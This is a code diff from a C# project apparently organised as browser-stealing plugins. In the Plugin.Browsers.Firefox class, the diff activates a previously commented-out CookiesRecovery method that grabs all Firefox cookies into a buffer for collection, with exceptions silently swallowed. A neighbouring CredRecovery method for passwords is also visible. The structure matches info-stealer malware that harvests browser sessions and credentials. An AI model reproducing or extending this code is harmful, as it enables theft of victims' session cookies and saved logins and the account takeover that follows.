@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Plugin.Browsers.Firefox.Cookies;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -10,30 +11,30 @@ namespace Plugin.Browsers.Firefox
     public class Firefox
     {
         public bool isOK = false;
-        //public void CookiesRecovery(StringBuilder Cooks)
-        //{
-        //    try
-        //    {
-        //        List<FFCookiesGrabber.FirefoxCookie> ffcs = Cookies.FFCookiesGrabber.Cookies();
-        //        foreach (FFCookiesGrabber.FirefoxCookie fcc in ffcs)
-        //        {
-        //            if (!string.IsNullOrWhiteSpace(fcc.ToString()) && !isOK)
-        //            {
-        //                Cooks.Append("\n== Firefox ==========\n");
-        //                isOK = true;
-        //            }
-        //            Cooks.Append(string.Concat(new string[]
-        //               {
-        //                    fcc.ToString(),
-        //                    "\n\n",
-        //               }));
-        //        }
-        //        Cooks.Append("\n");
-        //    }
-        //    catch
-        //    {
-        //    }
-        //}
+        public void CookiesRecovery(StringBuilder Cooks)
+        {
+            try
+            {
+                List<FFCookiesGrabber.FirefoxCookie> ffcs = Cookies.FFCookiesGrabber.Cookies();
+                foreach (FFCookiesGrabber.FirefoxCookie fcc in ffcs)
+                {
+                    if (!string.IsNullOrWhiteSpace(fcc.ToString()) && !isOK)
+                    {
+                        Cooks.Append("\n== Firefox ==========\n");
+                        isOK = true;
+                    }
+                    Cooks.Append(string.Concat(new string[]
+                       {
+                            fcc.ToString(),
+                            "\n\n",
+                       }));
+                }
+                Cooks.Append("\n");
+            }
+            catch
+            {
+            }
+        }
 
         public void CredRecovery(StringBuilder Pass)
         {
